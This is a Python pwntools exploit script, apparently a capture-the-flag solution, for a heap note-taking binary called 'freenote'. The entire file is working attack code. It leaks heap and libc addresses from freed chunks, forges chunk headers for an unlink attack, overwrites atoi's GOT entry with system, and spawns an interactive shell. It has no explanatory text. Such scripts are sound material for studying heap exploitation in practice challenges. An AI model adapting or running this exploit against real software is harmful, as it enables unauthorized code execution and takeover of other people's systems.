from pwn import *

context.log_level = "debug"

libc = ELF('/lib/x86_64-linux-gnu/libc-2.24.so')
atoi_plt = 0x602070

libc_system = libc.symbols['system']

def choose(choice):
	p.sendlineafter('Your choice:', str(choice))

def listNote(count):
	choose(1)
	a = []
	for i in range(count):
		a.append(p.recvuntil('\n')[:-1])
	return a

def newNote(data):
	choose(2)
	p.sendlineafter('Length of new note:', str(len(data)))
	p.sendafter('Enter your note:', str(data))

def editNote(index, data):
	choose(3)
	p.sendlineafter('Note number:', str(index))
	p.sendlineafter('Length of note:', str(len(data)))
	p.sendafter('Enter your note:', str(data))		

def deleteNote(index):
	choose(4)
	p.sendlineafter('Note number:', str(index))	

p = process('./freenote')	
# b *0x00400998

newNote('A'*0x8)
newNote('B'*0x8)
newNote('C'*0x8)
newNote('D'*0x8)
newNote('E'*0x8)
newNote('F'*0x8)

deleteNote(0)
deleteNote(2)
deleteNote(4)

newNote('a'*0x8)
newNote('b'*0x8)
newNote('c'*0x8)
leak = listNote(5)

heapLeak = leak[0][4+8:]
heapLeak = u64(leak[0][4+8:] + '\x00'*(8-len(heapLeak)))
libcLeak = leak[4][3+8:]
libcLeak = u64(leak[4][3+8:] + '\x00'*(8-len(libcLeak)))

libc_main_arena = libc.symbols['__malloc_hook'] + (libc.symbols['__malloc_hook'] - libc.symbols['__realloc_hook'])*2
libc_base = libcLeak - libc_main_arena - 0x58

heap_base = heapLeak - 0x1820 - 0x90*2

system_addr = libc_base + libc_system

newNote('G'*0x8)
newNote('H'*0x8)

deleteNote(6)
deleteNote(7)

newNote(p64(0x0) + p64(0x0) + p64(heap_base+0xc0-0x18) + p64(heap_base+0xc0-0x10) + 'l'*0x60 + p64(0x80) + p64(0x90) + 'k'*0x80 + p64(0x90) + p64(0x71))
deleteNote(7)

editNote(6, p64(atoi_plt) + p64(0x1) + 'h'*0x110)
editNote(5, p64(system_addr))
p.sendlineafter('Your choice: ', 'sh')
p.interactive()


